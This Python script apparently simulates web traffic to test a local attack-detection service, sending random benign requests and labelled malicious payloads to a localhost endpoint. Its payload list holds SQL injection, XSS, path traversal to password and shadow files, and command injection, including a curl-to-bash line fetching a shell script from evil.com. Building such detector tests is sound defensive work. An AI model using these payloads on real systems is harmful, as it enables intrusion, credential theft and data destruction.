import random
import time
import urllib.request
import urllib.error
import json

URL = "http://localhost:8000/analyze"

SAFE_PAYLOADS = [
    "GET /index.html",
    "GET /about",
    "GET /products?page=2",
    "POST /login username=alice&password=hunter2",
    "GET /api/users/42",
    "GET /static/logo.png",
    "POST /contact name=Bob&message=Hello",
    "GET /search?q=shoes",
    "GET /favicon.ico",
    "POST /api/cart item_id=7&qty=1",
    "GET /dashboard",
    "GET /api/status",
]

SAFE_USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/124.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
]

MALICIOUS = [
    # SQL Injection
    ("' OR '1'='1' --",                         "sqlmap/1.7",           "SQL Injection"),
    ("1; DROP TABLE users--",                    "Mozilla/5.0",          "SQL Injection"),
    ("' UNION SELECT username,password FROM users--", "curl/7.88",       "SQL Injection"),
    # XSS
    ("<script>document.cookie</script>",         "Mozilla/5.0",          "XSS"),
    ("<img src=x onerror=alert('xss')>",         "Mozilla/5.0",          "XSS"),
    ("javascript:alert(1)",                      "Mozilla/5.0",          "XSS"),
    # Path Traversal
    ("../../etc/passwd",                         "nikto/2.1.6",          "Path Traversal"),
    ("../../../windows/system32/config/sam",     "Mozilla/5.0",          "Path Traversal"),
    ("%2e%2e%2f%2e%2e%2fetc/shadow",             "Mozilla/5.0",          "Path Traversal"),
    # Command Injection
    ("; cat /etc/passwd",                        "Mozilla/5.0",          "Command Injection"),
    ("| whoami",                                 "Mozilla/5.0",          "Command Injection"),
    ("&& curl http://evil.com/shell.sh | bash",  "Mozilla/5.0",          "Command Injection"),
    # Suspicious user-agent only
    ("GET /admin",                               "sqlmap/1.7",           "Suspicious UA"),
    ("GET /login",                               "nikto/2.1.6",          "Suspicious UA"),
]

SOURCE_IPS = [
    "203.0.113.5", "198.51.100.12", "10.0.0.87", "192.168.1.45",
    "45.33.32.156", "185.220.101.3", "91.108.4.11", "172.16.0.99",
]


def send(payload, user_agent, source_ip):
    body = json.dumps({"source_ip": source_ip, "payload": payload, "user_agent": user_agent}).encode()
    req = urllib.request.Request(URL, data=body, headers={"Content-Type": "application/json"}, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return json.loads(resp.read())
    except urllib.error.URLError as e:
        return {"error": str(e)}


def main():
    print("Traffic simulator running — Ctrl+C to stop.\n")
    count = 0
    while True:
        ip = random.choice(SOURCE_IPS)

        if random.random() < 0.70:
            payload = random.choice(SAFE_PAYLOADS)
            ua = random.choice(SAFE_USER_AGENTS)
            result = send(payload, ua, ip)
            verdict = result.get("verdict", "?")
            print(f"[{count:>4}] SAFE     {ip:<18} {payload[:50]:<52} → {verdict}")
        else:
            payload, ua, label = random.choice(MALICIOUS)
            result = send(payload, ua, ip)
            verdict = result.get("verdict", "?")
            ttype = result.get("threat_type", label)
            print(f"[{count:>4}] MALICIOUS {ip:<18} {payload[:50]:<52} → {verdict} ({ttype})")

        count += 1
        time.sleep(random.uniform(1, 2))


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nStopped.")
